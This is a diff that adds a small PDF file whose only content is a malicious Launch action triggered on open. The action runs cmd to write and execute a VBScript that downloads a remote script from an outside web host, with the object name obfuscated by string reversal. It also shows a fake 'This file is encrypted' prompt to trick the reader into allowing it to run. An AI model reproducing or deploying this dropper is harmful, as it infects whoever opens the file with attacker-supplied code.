@@ -1,0 +1,19 @@
+%PDF-1.3
+55555555 0 obj
+<<
+ /tYpE /aCtIoN
+ /S /Launch
+ /Win
+ <<
+  /F (cmd)
+  /P (/c echo B="m.vbs":With CreateObject(StrReverse("PTTHLMX.2LMXSM")):.open "GET","http://flywintech.com/px/tmp/m.vbs",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B > %TEMP%\\m.vbs && %TEMP%\\m.vbs
+
+
+  && echo \n\n\nThis file is encrypted.\n\nIf you want to decrypt and read this file press "Open"?)
+ >>
+>>
+endobj
+1 0 obj<</Type/Catalog/Pages 2 0 R /OpenAction 55555555 0 R>>endobj
+2 0 obj<</Type/Pages/Count 1/Kids[ 4 0 R ]>>endobj
+4 0 obj<</Type/Page/Parent 2 0 R /Contents 12 0 R>>endobj
+trailer<</Root 1 0 R /Size 11>>
